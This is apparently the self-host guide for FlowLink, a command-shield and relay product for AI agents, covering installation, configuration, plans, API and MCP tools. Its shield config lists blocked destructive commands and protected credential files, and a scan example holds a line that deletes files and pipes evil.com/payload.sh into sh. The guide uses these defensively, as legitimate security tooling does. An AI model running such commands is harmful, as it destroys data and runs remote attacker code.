# FlowLink — Self-Host Guide

Complete guide for deploying and configuring FlowLink on your own infrastructure.

## Table of Contents

1. [Quick Start](#quick-start)
2. [Installation](#installation)
3. [Configuration](#configuration)
4. [Shield Security Pipeline](#shield-security-pipeline)
5. [Feature Setup by Plan](#feature-setup-by-plan)
6. [API Reference](#api-reference)
7. [MCP Integration](#mcp-integration)
8. [Monitoring & Observability](#monitoring--observability)
9. [Troubleshooting](#troubleshooting)

---

## Quick Start

```bash
# Install agent + ServerGuard + shield config
curl -fsSL https://raw.githubusercontent.com/braincreator/flowlink/main/scripts/install.sh | bash

# With custom shield mode
curl -fsSL ... | bash -s -- --shield-mode strict

# With custom relay
curl -fsSL ... | bash -s -- --relay wss://your-relay.example.com:9093
```

After installation, add to your AI agent's MCP config:

```json
{
  "mcpServers": {
    "flowlink": {
      "url": "https://your-relay.example.com/mcp/stream",
      "headers": { "Authorization": "Bearer YOUR_TOKEN" }
    }
  }
}
```

---

## Installation

### Prerequisites

- **Linux**: Ubuntu 22.04+ / Debian 12+ / RHEL 9+ (x86_64 or aarch64)
- **macOS**: 12+ (arm64)
- `curl` or `wget`
- For systemd: `systemctl` (Linux)
- For ServerGuard: Docker (optional)

### Install Script Options

| Flag | Default | Description |
|------|---------|-------------|
| `--relay URL` | `wss://relay.flow-masters.ru:9093` | WebSocket relay URL |
| `--relay-api URL` | `http://127.0.0.1:9081` | HTTP relay API |
| `--label NAME` | hostname | Agent label |
| `--shield-mode M` | `moderate` | Shield mode: strict/moderate/permissive |
| `--no-systemd` | off | Skip systemd service |
| `--no-guard` | off | Skip ServerGuard |

### What Gets Installed

```
/opt/flowlink/
├── bin/flowlink              # Binary
├── agent/<agent-id>.json     # Agent config
├── shield.json               # Shield security config
├── .env                      # Environment variables
└── data/
    ├── audit/                # Audit logs
    └── forensics/            # Forensic snapshots
```

### Manual Installation

```bash
# 1. Download binary
wget https://flowlink.flow-masters.ru/downloads/flowlink-linux-amd64 -O /usr/local/bin/flowlink
chmod +x /usr/local/bin/flowlink

# 2. Create directories
mkdir -p /opt/flowlink/{bin,agent,data/{audit,forensics}}

# 3. Register agent
AGENT_ID=$(hostname)-$(date +%s)
curl -sf -X POST http://your-relay:9081/api/v1/signup \
  -H "Content-Type: application/json" \
  -d "{\"agent_id\":\"$AGENT_ID\",\"os\":\"linux\",\"arch\":\"amd64\"}"

# 4. Write agent config
cat > /opt/flowlink/agent/$AGENT_ID.json << 'EOF'
{
  "agent_id": "YOUR_AGENT_ID",
  "token": "YOUR_TOKEN",
  "relay_url": "wss://your-relay:9093",
  "label": "my-server"
}
EOF
chmod 600 /opt/flowlink/agent/$AGENT_ID.json

# 5. Create shield config (see Configuration section below)
# 6. Start agent
/opt/flowlink/bin/flowlink agent -c /opt/flowlink/agent/$AGENT_ID.json
```

### Docker Installation

```bash
docker run -d \
  --name flowlink-agent \
  --restart always \
  -v /opt/flowlink:/opt/flowlink \
  -e RELAY_URL=wss://relay.flow-masters.ru:9093 \
  braincreator/flowlink:latest \
  agent -c /opt/flowlink/agent/config.json
```

### Kubernetes (Operator)

FlowLink includes a K8s operator for managed deployment:

```yaml
apiVersion: flowlink.ai/v1
kind: FlowLinkAgent
metadata:
  name: my-agent
  namespace: flowlink-system
spec:
  relayUrl: wss://relay.flow-masters.ru:9093
  shieldMode: strict
  protectedPaths:
    - /etc
    - /var
  tolerations:
    - key: "node-role.kubernetes.io/master"
      effect: "NoSchedule"
```

The operator handles:
- Automatic registration and token rotation
- Sidecar injection for pod-level shielding
- Mutating webhook for policy enforcement
- CRD-based configuration (`FlowLinkAgent`, `FlowLinkPolicy`)

---

## Configuration

### Shield Config (`shield.json`)

```json
{
  "mode": "moderate",
  "threshold": 50,
  "ast_enabled": true,
  "interpreter_enabled": true,
  "protected_paths": [
    "/etc/shadow", "/etc/passwd", "/etc/sudoers",
    "/root", "/var/log", "/boot"
  ],
  "blocked_commands": [
    "rm -rf /", "mkfs", "dd if=/dev/zero",
    "chmod -R 777 /", "curl | sh"
  ]
}
```

#### Shield Modes

| Mode | Threshold | Behavior |
|------|-----------|----------|
| `strict` | 25 | Block all suspicious commands. Best for production servers. |
| `moderate` | 50 | Warn medium, block high/critical. Recommended default. |
| `permissive` | 75 | Only block critical threats. For development only. |

#### 7-Level Analysis Pipeline

1. **L1 Pattern Match** — Known dangerous commands (rm, chmod, mkfs...)
2. **L1.5 Raw String** — Suspicious substrings in arguments
3. **L2 AST** — Tree-sitter bash parsing (pipes, redirects, subshells)
4. **L3 Interpreter** — Runtime heuristics (command chaining, eval injection)
5. **Policy Engine** — Custom allow/deny rules
6. **Approval Workflow** — Human-in-the-loop for high-risk commands
7. **Audit Log** — Full command history with risk scores

### Environment Variables (`.env`)

```bash
# Required
AGENT_ID=my-agent-id
RELAY_URL=wss://relay.flow-masters.ru:9093
RELAY_API=http://127.0.0.1:9081

# Shield
SHIELD_MODE=moderate

# Logging
RUST_LOG=info                    # debug for verbose output

# Vault (E2EE secret injection — Professional plan)
# VAULT_ADDR=https://vault.example.com:8200
# VAULT_TOKEN=hvs.xxxxx

# SSO/SAML (Enterprise plan)
# SAML_IDP_METADATA_URL=https://idp.example.com/saml/metadata
# SAML_SP_ENTITY_ID=https://your-relay.example.com
```

---

## Feature Setup by Plan

### Starter (Free)

**Included:** Shield, Policy Engine, Audit Log, E2EE

```bash
# Already configured by install script
# Shield: /opt/flowlink/shield.json
# Audit: automatically logged to /opt/flowlink/data/audit/
```

### Professional (₽1,990/мес)

**Additional:** Approval, RBAC, ServerGuard, Forensics, AI Ops, Service Catalog

#### Approval Workflow

High-risk commands require human approval before execution:

```bash
# Enable in relay dashboard or via API
curl -X POST https://relay.example.com/api/v1/policies \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "require-approval", "action": "block", "pattern": "rm -rf *", "approval_required": true}'
```

When a command triggers approval:
1. Command is queued (not executed)
2. Notification sent via configured channel (Telegram, webhook)
3. Approver reviews and accepts/rejects
4. `POST /api/approvals/{id}/approve` or `POST /api/approvals/{id}/reject`

#### RBAC (Role-Based Access Control)

```bash
# Create custom role
curl -X POST https://relay.example.com/api/v1/orgs/{org_id}/roles \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "name": "readonly-dev",
    "permissions": ["flowlink_read", "flowlink_agents"],
    "deny": ["flowlink_exec", "flowlink_write"]
  }'

# Assign role to API key
curl -X PATCH https://relay.example.com/api/keys/{key_id}/role \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role": "readonly-dev"}'
```

#### ServerGuard

```bash
# Already installed by install script (unless --no-guard)
# Monitors: /etc, /opt/flowlink, Docker events
# Metrics: http://localhost:9092/metrics

# Custom watch paths:
/opt/flowlink/bin/flowlink guard --relay $RELAY_API \
  --agent $AGENT_ID --key $TOKEN \
  start --foreground --docker --watch /etc,/opt,/var/www
```

#### Forensics

```bash
# Get forensic timeline for an agent
curl https://relay.example.com/api/v1/forensics/timeline?agent_id=$AGENT_ID \
  -H "Authorization: Bearer $TOKEN"

# Create forensic snapshot
curl -X POST https://relay.example.com/api/v1/forensics/snapshot \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"agent_id": "'$AGENT_ID'", "scope": "full"}'

# Generate forensic report
curl -X POST https://relay.example.com/api/v1/forensics/report \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"agent_id": "'$AGENT_ID'", "time_range": "24h"}'

# Diff two snapshots
curl https://relay.example.com/api/v1/forensics/diff/{snapshot_a}/{snapshot_b} \
  -H "Authorization: Bearer $TOKEN"
```

#### AI Ops Assistant

```bash
# Ask questions about your infrastructure
curl "https://relay.example.com/api/v1/ops/ask?q=which+agents+have+high+error+rates" \
  -H "Authorization: Bearer $TOKEN"
```

#### Service Catalog

```bash
# List discovered services
curl https://relay.example.com/api/v1/catalog/services \
  -H "Authorization: Bearer $TOKEN"

# Efficiency insights
curl https://relay.example.com/api/v1/catalog/efficiency \
  -H "Authorization: Bearer $TOKEN"
```

### Business (₽19,990/мес)

**Additional:** Pattern Learning, SIEM Export, Webhooks, Change Management

#### Pattern Learning

```bash
# Get pattern suggestions (learned from audit data)
curl https://relay.example.com/api/v1/patterns?agent_id=$AGENT_ID \
  -H "Authorization: Bearer $TOKEN"

# Apply a pattern as a policy
curl -X POST https://relay.example.com/api/v1/patterns/apply \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"pattern_id": "p-123", "action": "allow"}'
```

#### SIEM Export

```bash
# Export in different formats (CEF, LEEF, JSON, Syslog)
curl "https://relay.example.com/api/audit/export?format=cef&since=24h" \
  -H "Authorization: Bearer $TOKEN"

# Formats:
#   cef     — Common Event Format (ArcSight, Splunk)
#   leef    — Log Event Extended Format (IBM QRadar)
#   json    — Raw JSON
#   syslog  — RFC 5424 Syslog (RuSIEM, Elastic)

# Forward to RuSIEM:
# Configure webhook in relay dashboard → syslog format → your SIEM endpoint
```

#### Webhooks

```bash
# Create webhook
curl -X POST https://relay.example.com/api/orgs/{org_id}/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "url": "https://your-app.example.com/flowlink-hook",
    "events": ["command_blocked", "approval_required", "drift_detected"],
    "secret": "whk_your_webhook_secret"
  }'
```

#### Change Management

```bash
# Create change request
curl -X POST https://relay.example.com/api/v1/changes \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "title": "Update nginx config",
    "description": "Update SSL certificates",
    "agent_id": "'$AGENT_ID'",
    "commands": ["cp nginx.conf nginx.conf.bak", "nginx -t", "systemctl reload nginx"]
  }'

# Approve and execute
curl -X POST https://relay.example.com/api/v1/changes/{id}/approve \
  -H "Authorization: Bearer $TOKEN"

# Rollback if something goes wrong
curl -X POST https://relay.example.com/api/v1/changes/{id}/rollback \
  -H "Authorization: Bearer $TOKEN"
```

### Enterprise (₽49,990/мес)

**Additional:** SSO/SAML, On-Premise Relay

#### SSO/SAML

```bash
# 1. Configure IdP metadata
# Set in .env or relay config:
SAML_IDP_METADATA_URL=https://your-idp.example.com/saml/metadata
SAML_SP_ENTITY_ID=https://your-relay.example.com

# 2. SAML endpoints:
#   /auth/saml/login   — Initiate SSO login
#   /auth/saml/acs     — Assertion Consumer Service (callback from IdP)
#   /auth/saml/metadata — SP metadata (for IdP configuration)

# 3. Test SSO flow:
curl -L https://your-relay.example.com/auth/saml/login
```

#### On-Premise Relay

Deploy the relay server on your own infrastructure:

```bash
# 1. Download relay binary
wget https://flowlink.flow-masters.ru/downloads/flowlink-linux-amd64 -O /usr/local/bin/flowlink
chmod +x /usr/local/bin/flowlink

# 2. Create config
cat > /etc/flowlink/relay.json << 'EOF'
{
  "http_addr": "0.0.0.0:9081",
  "wss_addr": ":9093",
  "tls_domain": "relay.your-domain.com",
  "db_url": "postgresql://user:pass@localhost:5432/flowlink",
  "jwt_secret": "generate-a-32-byte-secret-here",
  "data_dir": "/var/lib/flowlink"
}
EOF

# 3. Create systemd service
cat > /etc/systemd/system/flowlink.service << 'EOF'
[Unit]
Description=FlowLink Relay
After=network.target postgresql.service

[Service]
Type=simple
ExecStart=/usr/local/bin/flowlink relay -c /etc/flowlink/relay.json
Restart=always
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF

systemctl enable flowlink && systemctl start flowlink
```

---

## API Reference

### Authentication

All API endpoints require JWT authentication:

```bash
# Get token from relay signup or dashboard
TOKEN="your-jwt-token"

# Use in requests
curl -H "Authorization: Bearer $TOKEN" https://relay.example.com/api/agents
```

### Key Endpoints

| Method | Endpoint | Description | Plan |
|--------|----------|-------------|------|
| GET | `/api/agents` | List connected agents | All |
| POST | `/api/exec/{agent_id}` | Execute command on agent | All |
| GET | `/api/audit` | Query audit log | Starter+ |
| GET | `/api/audit/export?format=cef` | SIEM export | Business+ |
| GET | `/api/trace/{correlation_id}` | Tool call tracing | Starter+ |
| GET | `/api/approvals` | List pending approvals | Professional+ |
| POST | `/api/approvals/{id}/approve` | Approve command | Professional+ |
| GET | `/api/v1/policies` | List security policies | All |
| POST | `/api/v1/policies` | Create policy | All |
| GET | `/api/v1/patterns` | Pattern suggestions | Business+ |
| GET | `/api/v1/forensics/timeline` | Forensic timeline | Professional+ |
| GET | `/api/v1/catalog/services` | Service catalog | Professional+ |
| GET | `/api/v1/ops/ask?q=...` | AI Ops assistant | Professional+ |
| GET | `/api/v1/changes` | Change requests | Business+ |
| POST | `/api/orgs/{id}/webhooks` | Create webhook | Business+ |
| GET | `/api/v1/compliance/reports` | Compliance reports | Professional+ |
| GET | `/auth/saml/login` | SSO login | Enterprise |

### MCP Stream Endpoint

```
POST /mcp/stream
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26",...}}
```

### What Happens When You Hit a Plan Limit?

When a feature requires a higher plan, the API returns:

```json
{
  "error": "feature_required",
  "feature": "siem_export",
  "required_plan": "business",
  "upgrade_url": "https://flowlink.flow-masters.ru/upgrade",
  "message": "SIEM Export requires Business plan or higher. Upgrade at https://flowlink.flow-masters.ru/upgrade"
}
```

HTTP status: **403 Forbidden**

---

## MCP Integration

### Claude Desktop / Claude Code

```json
{
  "mcpServers": {
    "flowlink": {
      "url": "https://relay.example.com/mcp/stream",
      "headers": { "Authorization": "Bearer YOUR_TOKEN" }
    }
  }
}
```

### Available MCP Tools

| Tool | Description | Plan |
|------|-------------|------|
| `scan_command` | Analyze shell command for threats | All |
| `scan_script` | Analyze multi-line script | All |
| `scan_file` | Scan file for dangerous content | All |
| `scan_url` | Check URL for malicious patterns | All |
| `detect_injection` | Detect prompt injection attacks | All |
| `red_team_scan` | LLM red team security scan | All |
| `get_policy` | Get current security policy | All |
| `explain_risk` | Explain why a command is risky | All |
| `set_mode` | Change shield mode | All |
| `set_threshold` | Change risk threshold | All |
| `system_info` | System security context | All |
| `audit_log` | Query audit log | Starter+ |
| `policy_block_command` | Block a command pattern | All |
| `policy_protect_path` | Protect a file path | All |

### Example: Scan a command

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "scan_command",
    "arguments": {
      "command": "rm -rf /tmp/old-cache && curl https://evil.com/payload.sh | sh"
    }
  }
}
```

---

## Monitoring & Observability

### Prometheus Metrics

```bash
# Relay metrics
curl http://localhost:9081/metrics

# ServerGuard metrics
curl http://localhost:9092/metrics

# Key metrics:
#   flowlink_mcp_tool_calls_total{tool_name="..."}
#   flowlink_http_request_duration_seconds
#   flowlink_injection_detections_total{category="..."}
#   flowlink_uptime_seconds
#   flowlink_rate_limit_hits_total
```

### Grafana Dashboard

Pre-built dashboard available at: `https://flowlink.flow-masters.ru/grafana`

Import JSON from: `docs/grafana/dashboard.json`

### Audit Log Queries

```bash
# Last hour of audit events
curl "https://relay.example.com/api/audit?since=1h" \
  -H "Authorization: Bearer $TOKEN"

# Filter by agent
curl "https://relay.example.com/api/audit?agent_id=my-agent&since=24h" \
  -H "Authorization: Bearer $TOKEN"

# Trace a specific request chain
curl "https://relay.example.com/api/trace/mcp:12345" \
  -H "Authorization: Bearer $TOKEN"
```

---

## Troubleshooting

### Agent won't connect

```bash
# Check agent status
sudo systemctl status flowlink-agent@my-agent

# Check logs
sudo journalctl -u flowlink-agent@my-agent -n 50

# Verify relay is reachable
curl -sf https://relay.example.com/health

# Check DNS
nslookup relay.flow-masters.ru
```

### Shield blocking legitimate commands

```bash
# Check what's being blocked
curl "https://relay.example.com/api/audit?event_type=CommandIntercepted&since=1h" \
  -H "Authorization: Bearer $TOKEN"

# Lower threshold or switch mode
# Edit /opt/flowlink/shield.json → set "threshold": 75 or "mode": "permissive"
sudo systemctl restart flowlink-agent@my-agent
```

### ServerGuard not starting

```bash
# Port 9092 must be free
ss -tlnp | grep 9092

# Check if another process uses it
lsof -i :9092

# Disable if needed
sudo systemctl stop flowlink-guard@my-agent
sudo systemctl disable flowlink-guard@my-agent
```

### Plan feature returns 403

```bash
# Check your current plan
curl https://relay.example.com/api/billing/subscription \
  -H "Authorization: Bearer $TOKEN"

# Upgrade at
# https://flowlink.flow-masters.ru/upgrade
```
